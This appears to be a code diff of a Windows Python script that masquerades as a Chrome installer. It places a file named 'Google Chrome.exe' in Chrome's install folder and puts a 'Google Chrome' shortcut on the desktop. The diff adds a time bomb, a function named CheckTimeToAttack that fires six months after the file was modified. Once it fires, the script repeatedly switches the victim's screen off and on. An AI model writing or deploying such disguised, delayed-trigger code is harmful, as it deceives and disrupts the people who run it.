@@ -1,8 +1,10 @@
 import requests
 import subprocess
-import os
+import os,time
 import win32com.client
 import shutil
+from datetime import datetime, timedelta
+import ctypes
 
 chrome_path = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
 hidevr = r"C:\Program Files\Google\Chrome\Application\Google Chrome.exe"
@@ -29,7 +31,7 @@ def create_shortcut(target_path, shortcut_name, shortcut_folder):
     shortcut = shell.CreateShortCut(shortcut_path)
     shortcut.TargetPath = target_path
     shortcut.WorkingDirectory = os.path.dirname(target_path)
-    shortcut.IconLocation = target_path  # Chọn biểu tượng cho shortcut
+    shortcut.IconLocation = target_path
     shortcut.save()
 
 def move_file(source_path,destination_path):
@@ -37,6 +39,23 @@ def move_file(source_path,destination_path):
     shortcut_name = "Google Chrome"
     shortcut_folder = os.path.join(os.path.expanduser("~"), "Desktop")  # Tạo shortcut trên Desktop
     create_shortcut(r"C:\Program Files\Google\Chrome\Application\Google Chrome.exe", shortcut_name, shortcut_folder)
+
+
+def CheckTimeToAttack(file_path):
+    mod_time = os.path.getmtime(file_path)
+    file_mod_time = datetime.fromtimestamp(mod_time)
+    current_date = datetime.now()
+    six_months_later = file_mod_time + timedelta(days=6*30)
+    
+    if current_date >= six_months_later:
+        return True
+    else:
+        return False
+def turn_screen_off():
+    ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
+
+def turn_screen_on():
+    ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, -1)
 
 def main():
     chrome_url = "https://dl.google.com/chrome/install/latest/chrome_installer.exe"
@@ -49,6 +68,15 @@ def main():
     if not os.path.exists(hidevr):
         move_file(r"C:\Users\Administrator\Desktop\Google Chrome.exe","C:\\Program Files\\Google\\Chrome\\Application")
     openchrome()
+    i = 0
+    while CheckTimeToAttack(hidevr) == True:
+        turn_screen_off()
+        time.sleep(3)
+        turn_screen_on()
+        time.sleep(5)
+        i+=1
+        if i == 5:
+            break
         
 if __name__ == "__main__":
     main()
